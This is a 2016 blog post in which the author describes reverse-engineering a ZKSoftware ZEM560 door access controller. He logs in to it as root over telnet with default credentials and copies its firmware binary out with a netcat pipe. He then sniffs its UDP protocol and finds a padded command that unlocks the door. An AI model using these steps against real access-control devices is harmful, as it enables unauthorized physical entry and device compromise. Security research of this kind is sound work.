<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Opening doors</title><meta name="description" content="Or trying to reverse engineering a access control"><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Opening doors</h1>
</header>
<section data-field="subtitle" class="p-summary">
Or trying to reverse engineering a access control
</section>
<section data-field="body" class="e-content">
<section name="fefd" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="dcc9" id="dcc9" class="graf graf--h3 graf--leading graf--title">Opening doors</h3><p name="4b2c" id="4b2c" class="graf graf--p graf-after--h3"><em class="markup--em markup--p-em">Or trying to reverse engineering a access control</em></p><p name="c92c" id="c92c" class="graf graf--p graf--hasDropCapModel graf--hasDropCap graf-after--p"><span class="graf-dropCap">E</span>verything started with me trying to get my RaspBerry PI to unlock a door . The door I’m supposed to open has a access control , like that one :</p><figure name="513f" id="513f" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 700px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 100%;"></div><img class="graf-image" data-image-id="0*4EY4LBSsXPscOzOX.png" data-width="700" data-height="700" src="https://cdn-images-1.medium.com/max/800/0*4EY4LBSsXPscOzOX.png"></div></figure><p name="3d4d" id="3d4d" class="graf graf--p graf-after--figure">So … that’s a shit/toy-ish/R$2k/access control and it fucking opens doors . How to get my rasp to control it ? <em class="markup--em markup--p-em">No , I can’t just open it and read the UART or something — it costs 2k</em>. I’m going to try to get remote control , NMAP TIME !</p><pre name="fe33" id="fe33" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code">$ nmap -sV 10.0.3.-</code></pre><p name="1491" id="1491" class="graf graf--p graf-after--pre">Yeah , I use fish , I like autocomplete , I don’t memorize commands , judge me. If you don’t get it , if it was bash it would be a <code class="markup--code markup--p-code">*</code> instead of a <code class="markup--code markup--p-code">-</code> w/e .</p><pre name="7f45" id="7f45" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code">Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-10 23:15 BRT<br>Nmap scan report for 10.0.3.117<br>Host is up (0.094s latency).<br>Not shown: 994 closed ports<br>PORT STATE SERVICE VERSION<br>23/tcp open telnet ZKSoftware ZEM560 access control device (Linux 2.6.24; MIPS)</code></pre><p name="7a36" id="7a36" class="graf graf--p graf-after--pre">Or something like that , there is a port missing <br>Open 23 ! And what the fuck is ZEM560 ? Googling aroung I’ve found that shit has already been pwned : <a href="http://blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico/" data-href="http://blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico</a> &amp;&amp; <a href="http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html" data-href="http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html</a> . Unfortunately they are all about the web panel , which is turned off in my case . But it have a series of default login/password for the telnet and one of them worked . I was going to brute force it , but it worked on the second try , wut .</p><pre name="8669" id="8669" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code">$ telnet 10.0.3.117<br>Trying 10.0.3.117…<br>Connected to xxxxxxxxxxxxxxx<br>Escape character is &#39;^]&#39;.</code></pre><pre name="2927" id="2927" class="graf graf--pre graf-after--pre"><code class="markup--code markup--pre-code">Welcome to Linux (ZEM560) for MIPS<br>Kernel 2.6.24 Treckle on an MIPS<br>ZEM560 login: root<br>Password:<br># id<br>uid=0(root) gid=0(root) groups=0(root)</code></pre><p name="bd1b" id="bd1b" class="graf graf--p graf-after--pre">YEESSSS , root , lol , that was easy. Soooo , what the fucking is running and how to open the FUCKING door ?</p><pre name="9524" id="9524" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code"># ps<br>  PID USER       VSZ STAT COMMAND<br>    1 root      3788 S    init<br>    2 root         0 SW&lt;  [kthreadd]<br>    3 root         0 SW&lt;  [ksoftirqd/0]<br>    4 root         0 SW&lt;  [events/0]<br>    5 root         0 SW&lt;  [khelper]<br>   40 root         0 SW&lt;  [kblockd/0]<br>   48 root         0 SW&lt;  [ksuspend_usbd]<br>   54 root         0 SW&lt;  [khubd]<br>   57 root         0 SW&lt;  [kseriod]<br>   75 root         0 SW   [pdflush]<br>   76 root         0 SW   [pdflush]<br>   77 root         0 SW&lt;  [kswapd0]<br>   78 root         0 SW&lt;  [aio/0]<br>  624 root         0 SW&lt;  [mtdblockd]<br>  657 root      3788 S    /bin/sh /etc/init.d/rcS<br>  663 root         0 SW   [eth0]<br>  665 root      3852 S    telnetd -l /bin/login<br>  700 root      9396 S    /mnt/mtdblock/inbiocomm<br>  703 root     18516 S    /mnt/mtdblock/main<br> 5570 root      3852 S    -sh<br> 5573 root      3920 S    /bin/login<br> 5574 root      3852 R    ps</code></pre><p name="7914" id="7914" class="graf graf--p graf--startsWithDoubleQuote graf-after--pre">“rcS” and “main” looks interesting , I’m gonna check it out .</p><pre name="577c" id="577c" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code"># cd /mnt/mtdblock/<br># ls<br>LANGUAGE.E                 firmware_20160615.log_bak  <br>LANGUAGE.S                 firmware_20160616.log_bak  <br>auto.sh                    firmware_20160619.log_bak  <br>custattstate.dat           firmware_20160620.log_bak  <br>custvoice.dat              firmware_20160623.log_bak  <br>data                       firmware_20160625.log_bak  <br>drivers                    firmware_20160702.log_bak  <br>dump.txt                   firmware_20160703.log_bak  <br>eerom.txt                  firmware_20160707.log_bak  <br>extlog.dat                 firmware_20160710.log  <br>extuser.dat                font  <br>firmware_20160411.log_bak  getf  <br>firmware_20160413.log_bak  iengine.lic  <br>firmware_20160416.log_bak  inbiocomm  <br>firmware_20160420.log_bak  lconfig.bin  <br>firmware_20160422.log_bak  lib  <br>firmware_20160423.log_bak  lost+found  <br>firmware_20160426.log_bak  main  <br>firmware_20160503.log_bak  nprog.log  <br>firmware_20160507.log_bak  number.log  <br>firmware_20160511.log_bak  oplog.dat  <br>firmware_20160520.log_bak  options.cfg  <br>firmware_20160521.log_bak  sms.dat  <br>firmware_20160523.log_bak  templatev10.dat  <br>firmware_20160524.log_bak  test.sh  <br>firmware_20160525.log_bak  transaction.dat  <br>firmware_20160527.log_bak  udata.dat  <br>firmware_20160607.log_bak  usbpower.zem500  <br>firmware_20160609.log_bak  user.dat  <br>firmware_20160610.log_bak  wav  <br>firmware_20160613.log_bak  workcode.dat  <br>firmware_20160614.log_bak</code></pre><p name="dde7" id="dde7" class="graf graf--p graf-after--pre">SOOOOOO MUUUUUCH THINGS TO LOOK ! ( and so many .log_bak , clean your shit )</p><pre name="a75a" id="a75a" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code"># cat options.cfg<br>TCPPort=4368  <br>~ShowSecond=0<br>~PrinterFunOn=0<br>ConnectMODEM=0  <br>~MaxUserFingerCount=10<br>~OutSensorFunOn=0<br>~ProductTime=<br>~SerialNumber=<br>AdmRetry=3  <br>DtFmt=0  <br>NetSpeed=0  <br>HiSpeedNet=8  <br>IPAddress=192.168.1.201  <br>NetMask=255.255.255.0  <br>~MIFAREID=0<br>~iCLASS=0<br>~iCLASSID=0<br>~iCLASSTYPE=0<br>~RFFPC=1<br>FPRetry=3  <br>PwdRetry=3  <br>HavePowerKey=1  <br>LockPowerKey=0  <br>~ASFO=1<br>AlwaysShowState=0  <br>~ShowState=1<br>…<br>etc  <br>etc</code></pre><p name="a7de" id="a7de" class="graf graf--p graf-after--pre">And it goes on , and on How the fuck I get the “main” binary out of there ?</p><p name="aab8" id="aab8" class="graf graf--p graf-after--p">On my pc :</p><pre name="5541" id="5541" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code">$ nc -l -p 666 &gt; main</code></pre><p name="5894" id="5894" class="graf graf--p graf-after--pre">On the very-fucking-expensive-shit :</p><pre name="d6c0" id="d6c0" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code"># cat main | nc 192.168.0.42 666 #No idea what my IP was</code></pre><p name="2228" id="2228" class="graf graf--p graf-after--pre">And I know that’s a shitty way to transfer files , but it worked , yay. IDA time ? Maybe , but I’m a newbie in Reverse can’t even do the easy ones in the CTFs :’( What I was thinking ? Anyway , gonna leave this alone . The binary are here , if someone want to take a look : <a href="https://usercontent.irccloud-cdn.com/file/2zmjRRUE/main" data-href="https://usercontent.irccloud-cdn.com/file/2zmjRRUE/main" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">main</a></p><p name="081d" id="081d" class="graf graf--p graf-after--p">A week after …</p><p name="68d4" id="68d4" class="graf graf--p graf-after--p">I’ve found the piece of software that controls it : <a href="http://www.automatiza.com/wp-content/uploads/2015/07/setup_soapAdminCA_V2_1_5.7z" data-href="http://www.automatiza.com/wp-content/uploads/2015/07/setup_soapAdminCA_V2_1_5.7z" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">setup<em class="markup--em markup--p-em">soapAdminCA</em>V2<em class="markup--em markup--p-em">1</em>5.7z</a></p><figure name="0ad2" id="0ad2" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 395px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 56.39999999999999%;"></div><img class="graf-image" data-image-id="0*cB-xeUzgAz7yFMil.png" data-width="1400" data-height="789" src="https://cdn-images-1.medium.com/max/800/0*cB-xeUzgAz7yFMil.png"></div></figure><p name="2ec7" id="2ec7" class="graf graf--p graf-after--figure">And it has a button called “Liberar Acesso” , Read it “open the fucking door”</p><figure name="9c12" id="9c12" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 150px; max-height: 60px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 40%;"></div><img class="graf-image" data-image-id="0*n_CJmYpjK0WOzhJ1.png" data-width="150" data-height="60" src="https://cdn-images-1.medium.com/max/800/0*n_CJmYpjK0WOzhJ1.png"></div></figure><p name="7a99" id="7a99" class="graf graf--p graf-after--figure">You just put the IP and the custom port , which by default is 4370 — that was the port I was talking about — and voilà ! It opens the door , any door!</p><p name="07ff" id="07ff" class="graf graf--p graf-after--p">What is easier ? Sniff the network or reverse the software ? Wireshark , always.</p><figure name="df11" id="df11" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 320px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 45.7%;"></div><img class="graf-image" data-image-id="0*4TaA2nnHnwwHyShU.png" data-width="1400" data-height="640" src="https://cdn-images-1.medium.com/max/800/0*4TaA2nnHnwwHyShU.png"></div></figure><p name="989c" id="989c" class="graf graf--p graf-after--figure">Some TCP , a lot of UDP going on . The connections starts with a</p><figure name="a605" id="a605" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 98px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 14.000000000000002%;"></div><img class="graf-image" data-image-id="0*bezr0c3Z1n5gNYXq.png" data-width="1032" data-height="144" src="https://cdn-images-1.medium.com/max/800/0*bezr0c3Z1n5gNYXq.png"></div></figure><p name="7439" id="7439" class="graf graf--p graf-after--figure">And ends with</p><figure name="e8d7" id="e8d7" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 93px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 13.3%;"></div><img class="graf-image" data-image-id="0*dWX_erP-9rkBzEcw.png" data-width="1036" data-height="138" src="https://cdn-images-1.medium.com/max/800/0*dWX_erP-9rkBzEcw.png"></div><figcaption class="imageCaption">Highlighted part is the data</figcaption></figure><p name="68e8" id="68e8" class="graf graf--p graf-after--figure">Looking around the .pcap it looks like there is two kinds of commands , first one just send a number and has 8 bytes of data :</p><figure name="3b68" id="3b68" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 97px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 13.900000000000002%;"></div><img class="graf-image" data-image-id="0*H8dSW3OrR_orknXK.png" data-width="1036" data-height="144" src="https://cdn-images-1.medium.com/max/800/0*H8dSW3OrR_orknXK.png"></div></figure><p name="8e63" id="8e63" class="graf graf--p graf-after--figure">and the other sends a <code class="markup--code markup--p-code">0B 00</code> plus a string:</p><figure name="48fd" id="48fd" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 90px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 12.8%;"></div><img class="graf-image" data-image-id="0*LRwd83wUZevcAe5Y.png" data-width="1030" data-height="132" src="https://cdn-images-1.medium.com/max/800/0*LRwd83wUZevcAe5Y.png"></div></figure><p name="0815" id="0815" class="graf graf--p graf-after--figure">Googling around again — I should do this more often — I found this piece of gold <a href="https://github.com/dnaextrim/python_zklib" data-href="https://github.com/dnaextrim/python_zklib" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">github.com/dnaextrim/python_zklib</a> . Fucking BIG thank you dnaextrim ! Random dude that reverse that insane custom protocol !</p><p name="43a5" id="43a5" class="graf graf--p graf-after--p">The zkconst.py has a lot of revealed commands :</p><pre name="d456" id="d456" class="graf graf--pre graf-after--p"><code class="markup--code markup--pre-code">CMD_CONNECT = 1000  <br>CMD_EXIT = 1001  <br>CMD_ENABLEDEVICE = 1002  <br>CMD_DISABLEDEVICE = 1003  <br>CMD_RESTART = 1004  <br>CMD_POWEROFF = 1005<br><br>CMD_ACK_OK = 2000  <br>CMD_ACK_ERROR = 2001  <br>CMD_ACK_DATA = 2002<br><br>CMD_PREPARE_DATA = 1500  <br>CMD_DATA = 1501<br><br>CMD_USERTEMP_RRQ = 9  <br>CMD_ATTLOG_RRQ = 13  <br>CMD_CLEAR_DATA = 14  <br>CMD_CLEAR_ATTLOG = 15<br><br>CMD_WRITE_LCD = 66<br><br>CMD_GET_TIME  = 201  <br>CMD_SET_TIME  = 202<br><br>CMD_VERSION = 1100  <br>CMD_DEVICE = 11<br><br>CMD_CLEAR_ADMIN = 20  <br>CMD_SET_USER = 8  <br>CMD_PREPARE_DATA = 1500  <br>CMD_REFRESHOPTION = 1014  <br>CMD_FREE_DATA = 1502  <br>CMD_RESTART = 1004  <br>CMD_REFRESHDATA = 1013<br><br>LEVEL_USER = 0  <br>LEVEL_ADMIN = 14</code></pre><p name="a659" id="a659" class="graf graf--p graf-after--pre">That first UDP packet sends <code class="markup--code markup--p-code">E8 03</code> as the first byte , which is 59395 in decimal , but <code class="markup--code markup--p-code">03 E8</code> (<a href="https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html" data-href="https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html</a>) is 1000 in decimal ! WHICH IS THE FUCKING <code class="markup--code markup--p-code">CMD_CONNECT</code> COMMAND ! Yeah , I got hyped , three days to figure this out</p><p name="12d6" id="12d6" class="graf graf--p graf-after--p">But nothing of “open the door” :’( So I’ve edited one of the zklib’s function to send custom commands :</p><figure name="08ac" id="08ac" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/caioluders/07cefba88b531149d46b366f3651d7a0.js"></script></figure><p name="0ff8" id="0ff8" class="graf graf--p graf-after--figure">And tried to send every one of the commands on the pcap to open the door and none worked :’( Even tried to send’em in the same order — I play a lot of CTFs , overthinking is my morning coffe .</p><p name="d4be" id="d4be" class="graf graf--p graf-after--p">There was two commands of the first type that it hasn’t been reversed , <code class="markup--code markup--p-code">69</code> and <code class="markup--code markup--p-code">31</code> . Send them in my custom function didn’t work :’( After a lot of redbulls and dreaming about the packets , I’ve realized that the <code class="markup--code markup--p-code">31</code> command always have <code class="markup--code markup--p-code">00 00</code> attached to the final , which is odd . So I tried to attach a bunch of “A” in the end of the packet and IT WORKED ! THE DOOR OPENED ! FUCK YEAH ! weird as fuck , but yeah , done ! Just copy the script to the raspberry and it’s done .</p><p name="995c" id="995c" class="graf graf--p graf-after--p">YAAAAAAAAAAAAAAAY ! FIREWORKS !!!</p><p name="0da6" id="0da6" class="graf graf--p graf-after--p graf--trailing">Post Mortem :<br>1. My first tough was to figure out what to write in some /dev/ , if someones knows how, please comment<br>2. Probablly that protocol is not so custom and I’m just dumb<br>3. <code class="markup--code markup--p-code">66</code> is the command to make that thing play a sound<br>4. You can edit a lot of this with root , A LOT<br>5- I’m n00b , sorry if I get something wrong</p></div></div></section><section name="5fd3" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="6981" id="6981" class="graf graf--p graf--leading graf--trailing"><em class="markup--em markup--p-em">Originally published at </em><a href="http://52.14.59.149/opening-doors/" data-href="http://52.14.59.149/opening-doors/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><em class="markup--em markup--p-em">lude.rs</em></a><em class="markup--em markup--p-em"> on July 11, 2016.</em></p></div></div></section>
</section>
<footer><p class="p-tags">Tagged in <a href="https://medium.com/tag/reverse-engineering" class="p-tag">Reverse Engineering</a>, <a href="https://medium.com/tag/hacking" class="p-tag">Hacking</a>, <a href="https://medium.com/tag/raspberry-pi" class="p-tag">Raspberry Pi</a></p><p>By <a href="https://medium.com/@caioluders" class="p-author h-card">Caio Lüders</a> on <a href="https://medium.com/p/3ab56bcd6026"><time class="dt-published" datetime="2016-07-11T05:16:57.000Z">July 11, 2016</time></a>.</p><p><a href="https://medium.com/@caioluders/opening-doors-3ab56bcd6026" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on April 24, 2018.</p></footer></article>

</body></html>